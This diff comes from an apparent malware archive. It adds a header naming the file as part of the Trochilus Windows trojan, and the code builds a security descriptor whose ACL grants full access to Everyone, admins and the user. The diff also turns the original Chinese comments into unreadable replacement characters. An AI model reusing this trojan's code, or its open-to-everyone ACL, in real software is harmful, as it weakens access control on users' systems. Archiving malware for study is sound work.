@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <Aclapi.h>
 #include "CSharedSA.h"
@@ -14,7 +25,7 @@ BOOL CShareRestrictedSD::BuildRestrictedSD()
 
 	__try   
 	{   
-		//»ñµÃsid
+		//ï¿½ï¿½ï¿½sid
 		SID_IDENTIFIER_AUTHORITY siaWorld = SECURITY_WORLD_SID_AUTHORITY;
 		if (!AllocateAndInitializeSid(&siaWorld, 1,
 			SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,     
@@ -41,7 +52,7 @@ BOOL CShareRestrictedSD::BuildRestrictedSD()
 			__leave;
 		}
 
-		//ÉèÖÃ·ÃÎÊ×é
+		//ï¿½ï¿½ï¿½Ã·ï¿½ï¿½ï¿½ï¿½ï¿½
 		ZeroMemory(ea, sizeof(ea));
 
 		ea[0].grfAccessPermissions = GENERIC_ALL;
@@ -65,14 +76,14 @@ BOOL CShareRestrictedSD::BuildRestrictedSD()
 		ea[2].Trustee.TrusteeType = TRUSTEE_IS_USER;
 		ea[2].Trustee.ptstrName = (LPWSTR) pAdminuUserSID;
 
-		//´´½¨²¢Ìî³äACL
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ACL
 		if (ERROR_SUCCESS != SetEntriesInAcl(3, ea, NULL, &pAcl))
 		{
 			printf("SetEntriesInAcl failed %d\n", GetLastError());
 			__leave;
 		}
 
-		// ´´½¨²¢³õÊ¼»¯SD
+		// ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½SD
 		pSD = (PSECURITY_DESCRIPTOR) LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH); 
 		if (pSD == NULL)
 		{ 
@@ -85,7 +96,7 @@ BOOL CShareRestrictedSD::BuildRestrictedSD()
 			__leave;
 		}
 
-		//ÉèÖÃSDµÄACL
+		//ï¿½ï¿½ï¿½ï¿½SDï¿½ï¿½ACL
 		if (! SetSecurityDescriptorDacl(pSD, TRUE, pAcl, FALSE))
 		{   
 			printf("SetSecurityDescriptorDacl() failed with error %d\n", GetLastError());
@@ -101,7 +112,7 @@ BOOL CShareRestrictedSD::BuildRestrictedSD()
 		if (pAdminuUserSID) FreeSid(pAdminuUserSID);
 	}   
 
-	//Èç¹ûÊ§°ÜÁË£¬ÇåÀí
+	//ï¿½ï¿½ï¿½Ê§ï¿½ï¿½ï¿½Ë£ï¿½ï¿½ï¿½ï¿½ï¿½
 	if(! bResult)
 	{   
 		if (pAcl) 
